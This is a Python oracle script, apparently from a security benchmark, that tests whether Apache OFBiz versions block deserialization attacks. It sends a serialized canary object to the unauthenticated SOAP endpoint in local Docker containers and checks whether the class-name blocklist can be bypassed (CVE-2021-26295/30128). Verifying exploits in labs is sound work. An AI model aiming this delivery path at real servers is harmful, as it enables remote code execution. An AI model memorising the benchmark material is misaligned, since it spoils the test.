#!/usr/bin/env python3
"""Flag differential oracle for deser_ofbiz_xmlrpc -- REAL Apache OFBiz, REAL external HTTP trigger.

CVE-2021-26295 [OFBiz service-engine XML deserialization; 17.12.06 adds a SafeObjectInputStream class-name
BLOCKLIST rejecting "java.rmi.server"] -> CVE-2021-30128 [that blocklist is INCOMPLETE: the allowlist
regex .find() lets an "xxx.java.xxx" name pass and the narrow blocklist misses other RMI-family names;
17.12.07 replaces it with a broad denyList {"rmi","<"}], CWE-502.

The sink is exercised over the REAL, unauthenticated endpoint:  POST /webtools/control/SOAPService
with a SOAP body containing an OFBiz <cus-obj> element (hex-encoded serialized object). OFBiz's
SOAPEventHandler -> SoapSerializer (org.apache.ofbiz.service.engine) -> XmlSerializer.deserializeCustom
-> UtilObject.getObject -> SafeObjectInputStream.readObject runs the version's real class-name filter on
the benign shadow-class name. The benign canary's readObject reads the planted /canary/flag.txt and echoes
${PCB_FLAG} to /canary/echo.txt (and OFBiz stdout) IFF the filter let the class through -> flag observed
= blacklist bypassed.

Variant A (same sink, same read-exfil channel):
  V0 = OFBiz 17.12.05 (pre-CVE-2021-26295; no rmi blocklist)                 -> flag via java.rmi.server name
  V1 = OFBiz 17.12.06 (CVE-2021-26295 fix; narrow "java.rmi.server" blocklist) <- target
  V2 = OFBiz 17.12.07 (CVE-2021-30128 fix; broad {"rmi","<"} denyList)         <- negative

Usage:
  python3 oracle.py --run-gate            # compose up (v0,v1) --build + gate + teardown
  python3 oracle.py --run-gate --with-v2  # also verify residual + original blocked on v2
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import time
import urllib.request
import urllib.error
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[2] / "benchmark"))
from flag_oracle import FlagOracle, new_flag, validate_case  # noqa: E402

sys.path.insert(0, str(HERE))
from original_poc import candidate as _original_candidate  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or new_flag()

SERVICE = {"v0": "v0", "v1": "v1", "v2": "v2"}
HOSTPORT = {"v0": 18630, "v1": 18631, "v2": 18632}

SOAP_TMPL = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
    '<soapenv:Header/>'
    '<soapenv:Body>'
    '<pcbProbe>'
    '<cus-obj>{hex}</cus-obj>'
    '</pcbProbe>'
    '</soapenv:Body>'
    '</soapenv:Envelope>'
)


def _compose(*args, env=None, stdin=None, timeout=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        input=stdin, capture_output=True, check=False, timeout=timeout,
        env={**os.environ, **(env or {})},
    )


def _exec(version, sh, timeout=30):
    return _compose("exec", "-T", SERVICE[version], "sh", "-c", sh,
                    env={"PCB_FLAG": FLAG}, timeout=timeout)


def _http_post_soap(version, payload_hex, timeout=30):
    url = f"http://127.0.0.1:{HOSTPORT[version]}/webtools/control/SOAPService"
    body = SOAP_TMPL.format(hex=payload_hex).encode()
    req = urllib.request.Request(url, data=body, method="POST",
                                 headers={"Content-Type": "text/xml; charset=UTF-8",
                                          "SOAPAction": ""})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(4000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(4000).decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return -1, f"HTTP_ERROR {type(e).__name__}: {e}"


def run_probe(candidate, *, version="v1"):
    """Fire ONE real external HTTP request at the running OFBiz's SOAP endpoint carrying the candidate's
    benign serialized shadow-class, then observe whether the version's real SafeObjectInputStream let it
    through (flag echoed by the canary's readObject to /canary/echo.txt). Returns
    {version, id, canary_class, http_status, flag_echo, echo, resp_snip}."""
    if not isinstance(candidate, dict):
        candidate = {"canary_class": str(candidate)}
    fqcn = str(candidate.get("canary_class"))
    payload_hex = str(candidate.get("payload_hex", ""))
    # clear the per-probe echo side-channel
    _exec(version, ": > /canary/echo.txt")
    status, resp = _http_post_soap(version, payload_hex)
    time.sleep(1.0)  # allow the request thread's readObject to flush the echo file
    er = _exec(version, "cat /canary/echo.txt 2>/dev/null")
    echo = (er.stdout or "")
    flag_hit = FLAG if FLAG in echo else ""
    return {
        "version": version,
        "id": candidate.get("id"),
        "canary_class": fqcn,
        "http_status": status,
        "flag_echo": flag_hit,
        "echo": echo.strip(),
        "resp_snip": resp[:200],
    }


def original_poc(*, version="v1"):
    """[GIVEN] CVE-2021-26295 seed: java.rmi.server-named benign canary over the real SOAP endpoint."""
    return run_probe(_original_candidate(), version=version)


def bypass_poc(*, version="v1"):
    """[HELD-OUT] CVE-2021-30128 residual (java.rmi.registry / xxx.java.xxx), lazy import from _heldout/."""
    from importlib import util as _u
    spec = _u.spec_from_file_location("_bypass", HERE / "_heldout" / "bypass_poc.py")
    mod = _u.module_from_spec(spec)
    spec.loader.exec_module(mod)
    best = {"version": version, "canary_class": None, "flag_echo": ""}
    for vec in mod.VECTORS:
        res = run_probe(mod.candidate(vec), version=version)
        if res["flag_echo"]:
            return res
        best = res
    return best


def mechanism_scope(candidate) -> bool:
    return isinstance(candidate, dict) and ("canary_class" in candidate)


def build_oracle() -> FlagOracle:
    o = FlagOracle(FLAG, run_probe, mechanism_scope)
    o.prime_seed(original_poc)
    return o


def gate() -> dict:
    for v in ("v0", "v1", "v2"):
        _wait_ready(v)
    g = validate_case(
        flag=FLAG,
        original_on_v0=original_poc(version="v0"),
        original_on_v1=original_poc(version="v1"),
        bypass_on_v1=bypass_poc(version="v1"),
    )
    g["residual_blocked_on_v2"] = not bypass_poc(version="v2")["flag_echo"]
    g["passed"] = g["passed"] and g["residual_blocked_on_v2"]
    return g


def _profiles(*ps):
    out = []
    for p in ps:
        out += ["--profile", p]
    return out


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None  # do NOT follow OFBiz's 302 -> https://127.0.0.1/ (443 is not mapped)


_NOREDIR_OPENER = urllib.request.build_opener(_NoRedirect)


def _wait_ready(version, tries=120, delay=5):
    """Poll until the REAL OFBiz answers on its HTTP control servlet (boot can take a couple of minutes).
    OFBiz redirects /webtools/control/main (http) to https; we must NOT follow that redirect (443 is not
    mapped) -- a 302/200/4xx/5xx from the servlet means the webapp is up and serving."""
    url = f"http://127.0.0.1:{HOSTPORT[version]}/webtools/control/main"
    for _ in range(tries):
        try:
            req = urllib.request.Request(url, method="GET")
            with _NOREDIR_OPENER.open(req, timeout=8) as r:
                if r.status in (200, 302, 301, 303):
                    return True
        except urllib.error.HTTPError as e:
            if e.code in (200, 301, 302, 303, 401, 403, 500):
                return True
        except Exception:
            pass
        time.sleep(delay)
    return False


def run_gate(with_v2=False, keep_up=False) -> dict:
    global FLAG
    FLAG = new_flag()
    env = {"PCB_FLAG": FLAG}
    allp = _profiles("v0", "v1", "v2")
    _compose(*allp, "down", "-v", env={"PCB_FLAG": "teardown"})
    profiles = ("v0", "v1", "v2") if with_v2 else ("v0", "v1")
    # Images are prebuilt (docker compose ... build, done once); boot without --build so `up` just starts
    # the already-built REAL OFBiz images. (If an image is missing, build it first with:
    #   PCB_FLAG=build docker compose --profile vN build)
    r = _compose(*_profiles(*profiles), "up", "-d", env=env, timeout=1800)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-4000:]}
    for v in profiles:
        if not _wait_ready(v):
            return {"error": "OFBiz not ready (HTTP)", "version": v}
    result = gate()
    if with_v2:
        result["_residual_blocked_on_v2"] = not bypass_poc(version="v2")["flag_echo"]
        result["_original_blocked_on_v2"] = not original_poc(version="v2")["flag_echo"]
        result["_original_on_v0"] = original_poc(version="v0")
        result["_original_on_v1"] = original_poc(version="v1")
        result["_bypass_on_v1"] = bypass_poc(version="v1")
        result["_bypass_on_v2"] = bypass_poc(version="v2")
        result["_original_on_v2"] = original_poc(version="v2")
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*allp, "down", "-v", "--rmi", "all", env={"PCB_FLAG": "teardown"})
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--with-v2", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(with_v2=a.with_v2, keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
